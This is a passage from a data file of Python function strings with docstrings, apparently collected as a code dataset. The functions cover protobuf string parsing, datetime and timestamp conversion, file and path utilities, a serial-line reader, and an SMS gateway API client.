            "def _ConsumeSingleByteString(self):\n    \"\"\"Consume one token of a string literal.\n\n    String literals (whether bytes or text) can come in multiple adjacent\n    tokens which are automatically concatenated, like in C or Python.  This\n    method only consumes one token.\n\n    Returns:\n      The token parsed.\n    Raises:\n      ParseError: When the wrong format data is found.\n    \"\"\"\n    text = self.token\n    if len(text) < 1 or text[0] not in _QUOTES:\n      raise self._ParseError('Expected string but found: %r' % (text,))\n\n    if len(text) < 2 or text[-1] != text[0]:\n      raise self._ParseError('String missing ending quote: %r' % (text,))\n\n    try:\n      result = text_encoding.CUnescape(text[1:-1])\n    except ValueError as e:\n      raise self._ParseError(str(e))\n    self.NextToken()\n    return result"
        ],
        [
            "def arkt_to_unixt(ark_timestamp):\n    \"\"\" convert ark timestamp to unix timestamp\"\"\"\n    res = datetime.datetime(2017, 3, 21, 15, 55, 44) + datetime.timedelta(seconds=ark_timestamp)\n    return res.timestamp()"
        ],
        [
            "def close(self):\n        \"\"\"Close the connection.\"\"\"\n        try:\n            self.conn.close()\n            self.logger.debug(\"Close connect succeed.\")\n        except pymssql.Error as e:\n            self.unknown(\"Close connect error: %s\" % e)"
        ],
        [
            "def process_macros(self, content: str) -> str:\n        '''Replace macros with content defined in the config.\n\n        :param content: Markdown content\n\n        :returns: Markdown content without macros\n        '''\n\n        def _sub(macro):\n            name = macro.group('body')\n            params = self.get_options(macro.group('options'))\n\n            return self.options['macros'].get(name, '').format_map(params)\n\n        return self.pattern.sub(_sub, content)"
        ],
        [
            "def get_unique_pathname(path, root=''):\r\n\t\"\"\"Return a pathname possibly with a number appended to it so that it is\r\n\tunique in the directory.\"\"\"\r\n\tpath = os.path.join(root, path)\r\n\t# consider the path supplied, then the paths with numbers appended\r\n\tpotentialPaths = itertools.chain((path,), __get_numbered_paths(path))\r\n\tpotentialPaths = six.moves.filterfalse(os.path.exists, potentialPaths)\r\n\treturn next(potentialPaths)"
        ],
        [
            "def __get_numbered_paths(filepath):\r\n\t\"\"\"Append numbers in sequential order to the filename or folder name\r\n\tNumbers should be appended before the extension on a filename.\"\"\"\r\n\tformat = '%s (%%d)%s' % splitext_files_only(filepath)\r\n\treturn map(lambda n: format % n, itertools.count(1))"
        ],
        [
            "def splitext_files_only(filepath):\r\n\t\"Custom version of splitext that doesn't perform splitext on directories\"\r\n\treturn (\r\n\t\t(filepath, '') if os.path.isdir(filepath) else os.path.splitext(filepath)\r\n\t)"
        ],
        [
            "def set_time(filename, mod_time):\r\n\t\"\"\"\r\n\tSet the modified time of a file\r\n\t\"\"\"\r\n\tlog.debug('Setting modified time to %s', mod_time)\r\n\tmtime = calendar.timegm(mod_time.utctimetuple())\r\n\t# utctimetuple discards microseconds, so restore it (for consistency)\r\n\tmtime += mod_time.microsecond / 1000000\r\n\tatime = os.stat(filename).st_atime\r\n\tos.utime(filename, (atime, mtime))"
        ],
        [
            "def get_time(filename):\r\n\t\"\"\"\r\n\tGet the modified time for a file as a datetime instance\r\n\t\"\"\"\r\n\tts = os.stat(filename).st_mtime\r\n\treturn datetime.datetime.utcfromtimestamp(ts)"
        ],
        [
            "def ensure_dir_exists(func):\r\n\t\"wrap a function that returns a dir, making sure it exists\"\r\n\t@functools.wraps(func)\r\n\tdef make_if_not_present():\r\n\t\tdir = func()\r\n\t\tif not os.path.isdir(dir):\r\n\t\t\tos.makedirs(dir)\r\n\t\treturn dir\r\n\treturn make_if_not_present"
        ],
        [
            "def is_hidden(path):\r\n\t\"\"\"\r\n\tCheck whether a file is presumed hidden, either because\r\n\tthe pathname starts with dot or because the platform\r\n\tindicates such.\r\n\t\"\"\"\r\n\tfull_path = os.path.abspath(path)\r\n\tname = os.path.basename(full_path)\r\n\r\n\tdef no(path):\r\n\t\treturn False\r\n\tplatform_hidden = globals().get('is_hidden_' + platform.system(), no)\r\n\treturn name.startswith('.') or platform_hidden(full_path)"
        ],
        [
            "def age(self):\n        \"\"\"\n        Get closer to your EOL\n        \"\"\"\n        # 0 means this composer will never decompose\n        if self.rounds == 1:\n            self.do_run = False\n        elif self.rounds > 1:\n            self.rounds -= 1"
        ],
        [
            "def run(self):\n        \"\"\"\n        Open a connection over the serial line and receive data lines\n        \"\"\"\n        if not self.device:\n            return\n        try:\n            data = \"\"\n            while (self.do_run):\n                try:\n                    if (self.device.inWaiting() > 1):\n                        l = self.device.readline()[:-2]\n                        l = l.decode(\"UTF-8\")\n\n                        if (l == \"[\"):\n                            # start recording\n                            data = \"[\"\n                        elif (l == \"]\") and (len(data) > 4) and (data[0] == \"[\"):\n                            # now parse the input\n                            data = data + \"]\"\n                            self.store.register_json(data)\n                            self.age()\n                        elif (l[0:3] == \"  {\"):\n                            # this is a data line\n                            data = data + \" \" + l\n                    else:\n                        # this is a slow interface - give it some time\n                        sleep(1)\n                        # then count down..\n                        self.age()\n                except (UnicodeDecodeError, ValueError):\n                    # only accepting unicode: throw away the whole bunch\n                    data = \"\"\n                    # and count down the exit condition\n                    self.age()\n\n        except serial.serialutil.SerialException:\n            print(\"Could not connect to the serial line at \" + self.device_name)"
        ],
        [
            "def append_main_thread(self):\n        \"\"\"create & start main thread\n\n        :return: None\n        \"\"\"\n        thread = MainThread(main_queue=self.main_queue,\n                            main_spider=self.main_spider,\n                            branch_spider=self.branch_spider)\n        thread.daemon = True\n        thread.start()"
        ],
        [
            "def getTextFromNode(node):\n    \"\"\"\n    Scans through all children of node and gathers the\n    text. If node has non-text child-nodes then\n    NotTextNodeError is raised.\n    \"\"\"\n    t = \"\"\n    for n in node.childNodes:\n        if n.nodeType == n.TEXT_NODE:\n            t += n.nodeValue\n        else:\n            raise NotTextNodeError\n    return t"
        ],
        [
            "def getbalance(self, url='http://services.ambientmobile.co.za/credits'):\n        \"\"\"\n        Get the number of credits remaining at AmbientSMS\n        \"\"\"\n        postXMLList = []\n        postXMLList.append(\"<api-key>%s</api-key>\" % self.api_key)\n        postXMLList.append(\"<password>%s</password>\" % self.password)\n        postXML = '<sms>%s</sms>' % \"\".join(postXMLList)\n        result = self.curl(url, postXML)\n\n        if result.get(\"credits\", None):\n            return result[\"credits\"]\n        else:\n            raise AmbientSMSError(result[\"status\"])"
        ],
        [
            "def sendmsg(self,\n                message,\n                recipient_mobiles=[],\n                url='http://services.ambientmobile.co.za/sms',\n                concatenate_message=True,\n                message_id=str(time()).replace(\".\", \"\"),\n                reply_path=None,\n                allow_duplicates=True,\n                allow_invalid_numbers=True,\n                ):\n\n        \"\"\"\n        Send a mesage via the AmbientSMS API server\n        \"\"\"\n        if not recipient_mobiles or not(isinstance(recipient_mobiles, list) \\\n                or isinstance(recipient_mobiles, tuple)):\n            raise AmbientSMSError(\"Missing recipients\")\n\n        if not message or not len(message):\n            raise AmbientSMSError(\"Missing message\")\n\n        postXMLList = []\n        postXMLList.append(\"<api-key>%s</api-key>\" % self.api_key)\n        postXMLList.append(\"<password>%s</password>\" % self.password)\n        postXMLList.append(\"<recipients>%s</recipients>\" % \\\n                \"\".join([\"<mobile>%s</mobile>\" % \\\n                m for m in recipient_mobiles]))\n        postXMLList.append(\"<msg>%s</msg>\" % message)\n        postXMLList.append(\"<concat>%s</concat>\" % \\\n                (1 if concatenate_message else 0))\n        postXMLList.append(\"<message_id>%s</message_id>\" % message_id)\n        postXMLList.append(\"<allow_duplicates>%s</allow_duplicates>\" % \\\n                (1 if allow_duplicates else 0))\n        postXMLList.append(\n            \"<allow_invalid_numbers>%s</allow_invalid_numbers>\" % \\\n                    (1 if allow_invalid_numbers else 0)\n        )\n        if reply_path:\n            postXMLList.append(\"<reply_path>%s</reply_path>\" % reply_path)\n\n        postXML = '<sms>%s</sms>' % \"\".join(postXMLList)\n        result = self.curl(url, postXML)\n\n        status = result.get(\"status\", None)\n        if status and int(status) in [0, 1, 2]:\n            return result\n        else:\n            raise AmbientSMSError(int(status))"
        ],
        [
            "def curl(self, url, post):\n        \"\"\"\n        Inteface for sending web requests to the AmbientSMS API Server\n        \"\"\"\n        try:\n            req = urllib2.Request(url)\n            req.add_header(\"Content-type\", \"application/xml\")\n            data = urllib2.urlopen(req, post.encode('utf-8')).read()\n        except urllib2.URLError, v:\n            raise AmbientSMSError(v)\n        return dictFromXml(data)"
        ],
        [
            "def contents(self, f, text):\n        \"\"\"\n        Called for each file\n        Must return file content\n        Can be wrapped\n\n        :type f: static_bundle.files.StaticFileResult\n        :type text: str|unicode\n        :rtype: str|unicode\n        \"\"\"\n        text += self._read(f.abs_path) + \"\\r\\n\"\n        return text"
        ],
        [
            "def is_date_type(cls):\n    \"\"\"Return True if the class is a date type.\"\"\"\n    if not isinstance(cls, type):\n        return False\n    return issubclass(cls, date) and not issubclass(cls, datetime)"
        ],
        [
            "def to_datetime(when):\n    \"\"\"\n    Convert a date or time to a datetime. If when is a date then it sets the time to midnight. If\n    when is a time it sets the date to the epoch. If when is None or a datetime it returns when.\n    Otherwise a TypeError is raised. Returned datetimes have tzinfo set to None unless when is a\n    datetime with tzinfo set in which case it remains the same.\n    \"\"\"\n    if when is None or is_datetime(when):\n        return when\n    if is_time(when):\n        return datetime.combine(epoch.date(), when)\n    if is_date(when):\n        return datetime.combine(when, time(0))\n    raise TypeError(\"unable to convert {} to datetime\".format(when.__class__.__name__))"
        ],
        [
            "def totz(when, tz=None):\n    \"\"\"\n    Return a date, time, or datetime converted to a datetime in the given timezone. If when is a\n    datetime and has no timezone it is assumed to be local time. Date and time objects are also\n    assumed to be UTC. The tz value defaults to UTC. Raise TypeError if when cannot be converted to\n    a datetime.\n    \"\"\"\n    if when is None:\n        return None\n    when = to_datetime(when)\n    if when.tzinfo is None:\n        when = when.replace(tzinfo=localtz)\n    return when.astimezone(tz or utc)"
        ],
        [
            "def ts(when, tz=None):\n    \"\"\"\n    Return a Unix timestamp in seconds for the provided datetime. The `totz` function is called\n    on the datetime to convert it to the provided timezone. It will be converted to UTC if no\n    timezone is provided.\n    \"\"\"\n    if not when:\n        return None\n    when = totz(when, tz)\n    return calendar.timegm(when.timetuple())"
        ],
        [
            "def tsms(when, tz=None):\n    \"\"\"\n    Return a Unix timestamp in milliseconds for the provided datetime. The `totz` function is\n    called on the datetime to convert it to the provided timezone. It will be converted to UTC if\n    no timezone is provided.\n    \"\"\"\n    if not when:\n        return None\n    when = totz(when, tz)\n    return calendar.timegm(when.timetuple()) * 1000 + int(round(when.microsecond / 1000.0))"
        ],
        [
            "def fromts(ts, tzin=None, tzout=None):\n    \"\"\"\n    Return the datetime representation of the provided Unix timestamp. By defaults the timestamp is\n    interpreted as UTC. If tzin is set it will be interpreted as this timestamp instead. By default\n    the output datetime will have UTC time. If tzout is set it will be converted in this timezone\n    instead.\n    \"\"\"\n    if ts is None:\n        return None\n    when = datetime.utcfromtimestamp(ts).replace(tzinfo=tzin or utc)\n    return totz(when, tzout)"
        ],
        [
            "def fromtsms(ts, tzin=None, tzout=None):\n    \"\"\"\n    Return the Unix timestamp in milliseconds as a datetime object. If tz is set it will be\n    converted to the requested timezone otherwise it defaults to UTC.\n    \"\"\"\n    if ts is None:\n        return None\n    when = datetime.utcfromtimestamp(ts / 1000).replace(microsecond=ts % 1000 * 1000)\n    when = when.replace(tzinfo=tzin or utc)\n    return totz(when, tzout)"
        ],
        [
            "def truncate(when, unit, week_start=mon):\n    \"\"\"Return the datetime truncated to the precision of the provided unit.\"\"\"\n    if is_datetime(when):\n        if unit == millisecond:\n            return when.replace(microsecond=int(round(when.microsecond / 1000.0)) * 1000)\n        elif unit == second:\n            return when.replace(microsecond=0)\n        elif unit == minute:\n            return when.replace(second=0, microsecond=0)\n        elif unit == hour:\n            return when.replace(minute=0, second=0, microsecond=0)\n        elif unit == day:\n            return when.replace(hour=0, minute=0, second=0, microsecond=0)\n        elif unit == week:\n            weekday = prevweekday(when, week_start)\n            return when.replace(year=weekday.year, month=weekday.month, day=weekday.day,\n                                hour=0, minute=0, second=0, microsecond=0)\n        elif unit == month:\n            return when.replace(day=1, hour=0, minute=0, second=0, microsecond=0)\n        elif unit == year:\n            return when.replace(month=1, day=1, hour=0, minute=0, second=0, microsecond=0)\n    elif is_date(when):\n        if unit == week:\n            return prevweekday(when, week_start)\n        elif unit == month:\n            return when.replace(day=1)\n        elif unit == year:\n            return when.replace(month=1, day=1)\n    elif is_time(when):\n        if unit == millisecond:\n            return when.replace(microsecond=int(when.microsecond / 1000.0) * 1000)\n        elif unit == second:\n            return when.replace(microsecond=0)\n        elif unit == minute:\n            return when.replace(second=0, microsecond=0)\n    return when"
        ],
        [
            "def weekday(when, weekday, start=mon):\n    \"\"\"Return the date for the day of this week.\"\"\"\n    if isinstance(when, datetime):\n        when = when.date()\n\n    today = when.weekday()\n    delta = weekday - today\n    if weekday < start and today >= start:\n        delta += 7\n    elif weekday >= start and today < start:\n        delta -= 7\n    return when + timedelta(days=delta)"
        ],
        [
            "def _GetNativeEolStyle(platform=sys.platform):\n    '''\n    Internal function that determines EOL_STYLE_NATIVE constant with the proper value for the\n    current platform.\n    '''\n    _NATIVE_EOL_STYLE_MAP = {\n        'win32' : EOL_STYLE_WINDOWS,\n        'linux2' : EOL_STYLE_UNIX,\n        'linux' : EOL_STYLE_UNIX,\n        'darwin' : EOL_STYLE_MAC,\n    }\n    result = _NATIVE_EOL_STYLE_MAP.get(platform)\n\n    if result is None:\n        from ._exceptions import UnknownPlatformError\n        raise UnknownPlatformError(platform)\n\n    return result"
        ],
        [
            "def NormalizePath(path):\n    '''\n    Normalizes a path maintaining the final slashes.\n\n    Some environment variables need the final slash in order to work.\n\n    Ex. The SOURCES_DIR set by subversion must end with a slash because of the way it is used\n    in the Visual Studio projects.\n\n    :param unicode path:\n        The path to normalize.\n\n    :rtype: unicode\n    :returns:\n        Normalized path\n    '''\n    if path.endswith('/') or path.endswith('\\\\'):\n        slash = os.path.sep\n    else:\n        slash = ''\n    return os.path.normpath(path) + slash"
        ],
        [
            "def CanonicalPath(path):\n    '''\n    Returns a version of a path that is unique.\n\n    Given two paths path1 and path2:\n        CanonicalPath(path1) == CanonicalPath(path2) if and only if they represent the same file on\n        the host OS. Takes account of case, slashes and relative paths.\n\n    :param unicode path:\n        The original path.\n\n    :rtype: unicode\n    :returns:\n        The unique path.\n    '''\n    path = os.path.normpath(path)\n    path = os.path.abspath(path)\n    path = os.path.normcase(path)\n\n    return path"
        ],
        [
            "def StandardizePath(path, strip=False):\n    '''\n    Replaces all slashes and backslashes with the target separator\n\n    StandardPath:\n        We are defining that the standard-path is the one with only back-slashes in it, either\n        on Windows or any other platform.\n\n    :param bool strip:\n        If True, removes additional slashes from the end of the path.\n    '''\n    path = path.replace(SEPARATOR_WINDOWS, SEPARATOR_UNIX)\n    if strip:\n        path = path.rstrip(SEPARATOR_UNIX)\n    return path"
        ],
        [
            "def CopyFile(source_filename, target_filename, override=True, md5_check=False, copy_symlink=True):\n    '''\n    Copy a file from source to target.\n\n    :param  source_filename:\n        @see _DoCopyFile\n\n    :param  target_filename:\n        @see _DoCopyFile\n\n    :param bool md5_check:\n        If True, checks md5 files (of both source and target files), if they match, skip this copy\n        and return MD5_SKIP\n\n        Md5 files are assumed to be {source, target} + '.md5'\n\n        If any file is missing (source, target or md5), the copy will always be made.\n\n    :param  copy_symlink:\n        @see _DoCopyFile\n\n    :raises FileAlreadyExistsError:\n        If target_filename already exists, and override is False\n\n    :raises NotImplementedProtocol:\n        If file protocol is not accepted\n\n        Protocols allowed are:\n            source_filename: local, ftp, http\n            target_filename: local, ftp\n\n    :rtype: None | MD5_SKIP\n    :returns:\n        MD5_SKIP if the file was not copied because there was a matching .md5 file\n\n    .. seealso:: FTP LIMITATIONS at this module's doc for performance issues information\n    '''\n    from ._exceptions import FileNotFoundError\n\n    # Check override\n    if not override and Exists(target_filename):\n        from ._exceptions import FileAlreadyExistsError\n        raise FileAlreadyExistsError(target_filename)\n\n    # Don't do md5 check for md5 files themselves.\n    md5_check = md5_check and not target_filename.endswith('.md5')\n\n    # If we enabled md5 checks, ignore copy of files that haven't changed their md5 contents.\n    if md5_check:\n        source_md5_filename = source_filename + '.md5'\n        target_md5_filename = target_filename + '.md5'\n        try:\n            source_md5_contents = GetFileContents(source_md5_filename)\n        except FileNotFoundError:\n            source_md5_contents = None\n\n        try:\n            target_md5_contents = GetFileContents(target_md5_filename)\n        except FileNotFoundError:\n            target_md5_contents = None\n\n        if source_md5_contents is not None and \\\n           source_md5_contents == target_md5_contents and \\\n           Exists(target_filename):\n            return MD5_SKIP\n\n    # Copy source file\n    _DoCopyFile(source_filename, target_filename, copy_symlink=copy_symlink)\n\n    # If we have a source_md5, but no target_md5, create the target_md5 file\n    if md5_check and source_md5_contents is not None and source_md5_contents != target_md5_contents:\n        CreateFile(target_md5_filename, source_md5_contents)"
        ],
        [
            "def _CopyFileLocal(source_filename, target_filename, copy_symlink=True):\n    '''\n    Copy a file locally to a directory.\n\n    :param unicode source_filename:\n        The filename to copy from.\n\n    :param unicode target_filename:\n        The filename to copy to.\n\n    :param bool copy_symlink:\n        If True and source_filename is a symlink, target_filename will also be created as\n        a symlink.\n\n        If False, the file being linked will be copied instead.\n    '''\n    import shutil\n    try:\n        # >>> Create the target_filename directory if necessary\n        dir_name = os.path.dirname(target_filename)\n        if dir_name and not os.path.isdir(dir_name):\n            os.makedirs(dir_name)\n\n        if copy_symlink and IsLink(source_filename):\n            # >>> Delete the target_filename if it already exists\n            if os.path.isfile(target_filename) or IsLink(target_filename):\n                DeleteFile(target_filename)\n\n            # >>> Obtain the relative path from link to source_filename (linkto)\n            source_filename = ReadLink(source_filename)\n            CreateLink(source_filename, target_filename)\n        else:\n            # shutil can't copy links in Windows, so we must find the real file manually\n            if sys.platform == 'win32':\n                while IsLink(source_filename):\n                    link = ReadLink(source_filename)\n                    if os.path.isabs(link):\n                        source_filename = link\n                    else:\n                        source_filename = os.path.join(os.path.dirname(source_filename), link)\n\n            shutil.copyfile(source_filename, target_filename)\n            shutil.copymode(source_filename, target_filename)\n    except Exception as e:\n        reraise(e, 'While executiong _filesystem._CopyFileLocal(%s, %s)' % (source_filename, target_filename))"
        ],
        [
            "def CopyFiles(source_dir, target_dir, create_target_dir=False, md5_check=False):\n    '''\n    Copy files from the given source to the target.\n\n    :param unicode source_dir:\n        A filename, URL or a file mask.\n        Ex.\n            x:\\coilib50\n            x:\\coilib50\\*\n            http://server/directory/file\n            ftp://server/directory/file\n\n\n    :param unicode target_dir:\n        A directory or an URL\n        Ex.\n            d:\\Temp\n            ftp://server/directory\n\n    :param bool create_target_dir:\n        If True, creates the target path if it doesn't exists.\n\n    :param bool md5_check:\n        .. seealso:: CopyFile\n\n    :raises DirectoryNotFoundError:\n        If target_dir does not exist, and create_target_dir is False\n\n    .. seealso:: CopyFile for documentation on accepted protocols\n\n    .. seealso:: FTP LIMITATIONS at this module's doc for performance issues information\n    '''\n    import fnmatch\n\n    # Check if we were given a directory or a directory with mask\n    if IsDir(source_dir):\n        # Yes, it's a directory, copy everything from it\n        source_mask = '*'\n    else:\n        # Split directory and mask\n        source_dir, source_mask = os.path.split(source_dir)\n\n    # Create directory if necessary\n    if not IsDir(target_dir):\n        if create_target_dir:\n            CreateDirectory(target_dir)\n        else:\n            from ._exceptions import DirectoryNotFoundError\n            raise DirectoryNotFoundError(target_dir)\n\n    # List and match files\n    filenames = ListFiles(source_dir)\n\n    # Check if we have a source directory\n    if filenames is None:\n        return\n\n    # Copy files\n    for i_filename in filenames:\n        if md5_check and i_filename.endswith('.md5'):\n            continue  # md5 files will be copied by CopyFile when copying their associated files\n\n        if fnmatch.fnmatch(i_filename, source_mask):\n            source_path = source_dir + '/' + i_filename\n            target_path = target_dir + '/' + i_filename\n\n            if IsDir(source_path):\n                # If we found a directory, copy it recursively\n                CopyFiles(source_path, target_path, create_target_dir=True, md5_check=md5_check)\n            else:\n                CopyFile(source_path, target_path, md5_check=md5_check)"
        ],
        [
            "def CopyFilesX(file_mapping):\n    '''\n    Copies files into directories, according to a file mapping\n\n    :param list(tuple(unicode,unicode)) file_mapping:\n        A list of mappings between the directory in the target and the source.\n        For syntax, @see: ExtendedPathMask\n\n    :rtype: list(tuple(unicode,unicode))\n    :returns:\n        List of files copied. (source_filename, target_filename)\n\n    .. seealso:: FTP LIMITATIONS at this module's doc for performance issues information\n    '''\n    # List files that match the mapping\n    files = []\n    for i_target_path, i_source_path_mask in file_mapping:\n        tree_recurse, flat_recurse, dirname, in_filters, out_filters = ExtendedPathMask.Split(i_source_path_mask)\n\n        _AssertIsLocal(dirname)\n\n        filenames = FindFiles(dirname, in_filters, out_filters, tree_recurse)\n        for i_source_filename in filenames:\n            if os.path.isdir(i_source_filename):\n                continue  # Do not copy dirs\n\n            i_target_filename = i_source_filename[len(dirname) + 1:]\n            if flat_recurse:\n                i_target_filename = os.path.basename(i_target_filename)\n            i_target_filename = os.path.join(i_target_path, i_target_filename)\n\n            files.append((\n                StandardizePath(i_source_filename),\n                StandardizePath(i_target_filename)\n            ))\n\n    # Copy files\n    for i_source_filename, i_target_filename in files:\n        # Create target dir if necessary\n        target_dir = os.path.dirname(i_target_filename)\n        CreateDirectory(target_dir)\n\n        CopyFile(i_source_filename, i_target_filename)\n\n    return files"
        ],
        [
            "def CopyDirectory(source_dir, target_dir, override=False):\n    '''\n    Recursively copy a directory tree.\n\n    :param unicode source_dir:\n        Where files will come from\n\n    :param unicode target_dir:\n        Where files will go to\n\n    :param bool override:\n        If True and target_dir already exists, it will be deleted before copying.\n\n    :raises NotImplementedForRemotePathError:\n        If trying to copy to/from remote directories\n    '''\n    _AssertIsLocal(source_dir)\n    _AssertIsLocal(target_dir)\n\n    if override and IsDir(target_dir):\n        DeleteDirectory(target_dir, skip_on_error=False)\n\n    import shutil\n    shutil.copytree(source_dir, target_dir)"
        ],
        [
            "def DeleteFile(target_filename):\n    '''\n    Deletes the given local filename.\n\n    .. note:: If file doesn't exist this method has no effect.\n\n    :param unicode target_filename:\n        A local filename\n\n    :raises NotImplementedForRemotePathError:\n        If trying to delete a non-local path\n\n    :raises FileOnlyActionError:\n        Raised when filename refers to a directory.\n    '''\n    _AssertIsLocal(target_filename)\n\n    try:\n        if IsLink(target_filename):\n            DeleteLink(target_filename)\n        elif IsFile(target_filename):\n            os.remove(target_filename)\n        elif IsDir(target_filename):\n            from ._exceptions import FileOnlyActionError\n            raise FileOnlyActionError(target_filename)\n    except Exception as e:\n        reraise(e, 'While executing filesystem.DeleteFile(%s)' % (target_filename))"
        ],
        [
            "def AppendToFile(filename, contents, eol_style=EOL_STYLE_NATIVE, encoding=None, binary=False):\n    '''\n    Appends content to a local file.\n\n    :param unicode filename:\n\n    :param unicode contents:\n\n    :type eol_style: EOL_STYLE_XXX constant\n    :param eol_style:\n        Replaces the EOL by the appropriate EOL depending on the eol_style value.\n        Considers that all content is using only \"\\n\" as EOL.\n\n    :param unicode encoding:\n        Target file's content encoding.\n        Defaults to sys.getfilesystemencoding()\n\n    :param bool binary:\n        If True, content is appended in binary mode. In this case, `contents` must be `bytes` and not\n        `unicode`\n\n    :raises NotImplementedForRemotePathError:\n        If trying to modify a non-local path\n\n    :raises ValueError:\n        If trying to mix unicode `contents` without `encoding`, or `encoding` without\n        unicode `contents`\n    '''\n    _AssertIsLocal(filename)\n\n    assert isinstance(contents, six.text_type) ^ binary, 'Must always receive unicode contents, unless binary=True'\n\n    if not binary:\n        # Replaces eol on each line by the given eol_style.\n        contents = _HandleContentsEol(contents, eol_style)\n\n        # Handle encoding here, and always write in binary mode. We can't use io.open because it\n        # tries to do its own line ending handling.\n        contents = contents.encode(encoding or sys.getfilesystemencoding())\n\n    oss = open(filename, 'ab')\n    try:\n        oss.write(contents)\n    finally:\n        oss.close()"
        ],
        [
            "def MoveFile(source_filename, target_filename):\n    '''\n    Moves a file.\n\n    :param unicode source_filename:\n\n    :param unicode target_filename:\n\n    :raises NotImplementedForRemotePathError:\n        If trying to operate with non-local files.\n    '''\n    _AssertIsLocal(source_filename)\n    _AssertIsLocal(target_filename)\n\n    import shutil\n    shutil.move(source_filename, target_filename)"
        ],
        [
            "def MoveDirectory(source_dir, target_dir):\n    '''\n    Moves a directory.\n\n    :param unicode source_dir:\n\n    :param unicode target_dir:\n\n    :raises NotImplementedError:\n        If trying to move anything other than:\n            Local dir -> local dir\n            FTP dir -> FTP dir (same host)\n    '''\n    if not IsDir(source_dir):\n        from ._exceptions import DirectoryNotFoundError\n        raise DirectoryNotFoundError(source_dir)\n\n    if Exists(target_dir):\n        from ._exceptions import DirectoryAlreadyExistsError\n        raise DirectoryAlreadyExistsError(target_dir)\n\n    from six.moves.urllib.parse import urlparse\n    source_url = urlparse(source_dir)\n    target_url = urlparse(target_dir)\n\n    # Local to local\n    if _UrlIsLocal(source_url) and _UrlIsLocal(target_url):\n        import shutil\n        shutil.move(source_dir, target_dir)\n\n    # FTP to FTP\n    elif source_url.scheme == 'ftp' and target_url.scheme == 'ftp':\n        from ._exceptions import NotImplementedProtocol\n        raise NotImplementedProtocol(target_url.scheme)\n    else:\n        raise NotImplementedError('Can only move directories local->local or ftp->ftp')"
        ],
        [
            "def GetFileContents(filename, binary=False, encoding=None, newline=None):\n    '''\n    Reads a file and returns its contents. Works for both local and remote files.\n\n    :param unicode filename:\n\n    :param bool binary:\n        If True returns the file as is, ignore any EOL conversion.\n\n    :param unicode encoding:\n        File's encoding. If not None, contents obtained from file will be decoded using this\n        `encoding`.\n\n    :param None|''|'\\n'|'\\r'|'\\r\\n' newline:\n        Controls universal newlines.\n        See 'io.open' newline parameter documentation for more details.\n\n    :returns str|unicode:\n        The file's contents.\n        Returns unicode string when `encoding` is not None.\n\n    .. seealso:: FTP LIMITATIONS at this module's doc for performance issues information\n    '''\n    source_file = OpenFile(filename, binary=binary, encoding=encoding, newline=newline)\n    try:\n        contents = source_file.read()\n    finally:\n        source_file.close()\n\n    return contents"
        ],
        [
            "def GetFileLines(filename, newline=None, encoding=None):\n    '''\n    Reads a file and returns its contents as a list of lines. Works for both local and remote files.\n\n    :param unicode filename:\n\n    :param None|''|'\\n'|'\\r'|'\\r\\n' newline:\n        Controls universal newlines.\n        See 'io.open' newline parameter documentation for more details.\n\n    :param unicode encoding:\n        File's encoding. If not None, contents obtained from file will be decoded using this\n        `encoding`.\n\n    :returns list(unicode):\n        The file's lines\n\n    .. seealso:: FTP LIMITATIONS at this module's doc for performance issues information\n    '''\n    return GetFileContents(\n        filename,\n        binary=False,\n        encoding=encoding,\n        newline=newline,\n    ).split('\\n')"
        ],
        [
            "def ListFiles(directory):\n    '''\n    Lists the files in the given directory\n\n    :type directory: unicode | unicode\n    :param directory:\n        A directory or URL\n\n    :rtype: list(unicode) | list(unicode)\n    :returns:\n        List of filenames/directories found in the given directory.\n        Returns None if the given directory does not exists.\n\n        If `directory` is a unicode string, all files returned will also be unicode\n\n    :raises NotImplementedProtocol:\n        If file protocol is not local or FTP\n\n    .. seealso:: FTP LIMITATIONS at this module's doc for performance issues information\n    '''\n    from six.moves.urllib.parse import urlparse\n    directory_url = urlparse(directory)\n\n    # Handle local\n    if _UrlIsLocal(directory_url):\n        if not os.path.isdir(directory):\n            return None\n        return os.listdir(directory)\n\n    # Handle FTP\n    elif directory_url.scheme == 'ftp':\n        from ._exceptions import NotImplementedProtocol\n        raise NotImplementedProtocol(directory_url.scheme)\n    else:\n        from ._exceptions import NotImplementedProtocol\n        raise NotImplementedProtocol(directory_url.scheme)"
        ],
        [
            "def CreateFile(filename, contents, eol_style=EOL_STYLE_NATIVE, create_dir=True, encoding=None, binary=False):\n    '''\n    Create a file with the given contents.\n\n    :param unicode filename:\n        Filename and path to be created.\n\n    :param unicode contents:\n        The file contents as a string.\n\n    :type eol_style: EOL_STYLE_XXX constant\n    :param eol_style:\n        Replaces the EOL by the appropriate EOL depending on the eol_style value.\n        Considers that all content is using only \"\\n\" as EOL.\n\n    :param bool create_dir:\n        If True, also creates directories needed in filename's path\n\n    :param unicode encoding:\n        Target file's content encoding. Defaults to sys.getfilesystemencoding()\n        Ignored if `binary` = True\n\n    :param bool binary:\n        If True, file is created in binary mode. In this case, `contents` must be `bytes` and not\n        `unicode`\n\n    :return unicode:\n        Returns the name of the file created.\n\n    :raises NotImplementedProtocol:\n        If file protocol is not local or FTP\n\n    :raises ValueError:\n        If trying to mix unicode `contents` without `encoding`, or `encoding` without\n        unicode `contents`\n\n    .. seealso:: FTP LIMITATIONS at this module's doc for performance issues information\n    '''\n    # Lots of checks when writing binary files\n    if binary:\n        if isinstance(contents, six.text_type):\n            raise TypeError('contents must be str (bytes) when binary=True')\n    else:\n        if not isinstance(contents, six.text_type):\n            raise TypeError('contents must be unicode when binary=False')\n\n        # Replaces eol on each line by the given eol_style.\n        contents = _HandleContentsEol(contents, eol_style)\n\n        # Encode string and pretend we are using binary to prevent 'open' from automatically\n        # changing Eols\n        encoding = encoding or sys.getfilesystemencoding()\n        contents = contents.encode(encoding)\n        binary = True\n\n    # If asked, creates directory containing file\n    if create_dir:\n        dirname = os.path.dirname(filename)\n        if dirname:\n            CreateDirectory(dirname)\n\n    from six.moves.urllib.parse import urlparse\n    filename_url = urlparse(filename)\n\n    # Handle local\n    if _UrlIsLocal(filename_url):\n        # Always writing as binary (see handling above)\n        with open(filename, 'wb') as oss:\n            oss.write(contents)\n\n    # Handle FTP\n    elif filename_url.scheme == 'ftp':\n        # Always writing as binary (see handling above)\n        from ._exceptions import NotImplementedProtocol\n        raise NotImplementedProtocol(directory_url.scheme)\n    else:\n        from ._exceptions import NotImplementedProtocol\n        raise NotImplementedProtocol(filename_url.scheme)\n\n    return filename"
        ],
        [
